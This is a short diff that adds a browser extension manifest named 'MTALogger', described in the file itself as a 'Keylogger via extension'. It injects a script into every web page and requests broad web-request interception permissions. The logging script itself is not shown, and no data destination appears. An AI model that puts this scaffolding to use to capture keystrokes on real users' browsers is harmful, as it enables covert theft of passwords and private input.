@@ -1,0 +1,32 @@
+{
+    "manifest_version": 2,
+    "name": "MTALogger",
+    "version": "1.0",
+  
+    "description": "Keylogger via extension",
+  
+    "icons": {
+      "48": "Icons/icon.png"
+    },
+  
+    "content_scripts": [
+      {
+        "matches": ["<all_urls>"],
+        "js": ["mtalogger.js"]
+      }
+    ],
+
+    "permissions": [
+      "<all_urls>",
+      "webRequest",
+      "webRequestBlocking"
+    ],
+
+    "browser_specific_settings": {
+        "gecko": {
+          "id": "claudiu.ghenea@mta.ro",
+          "strict_min_version": "42.0"
+        }
+      }
+      
+  }
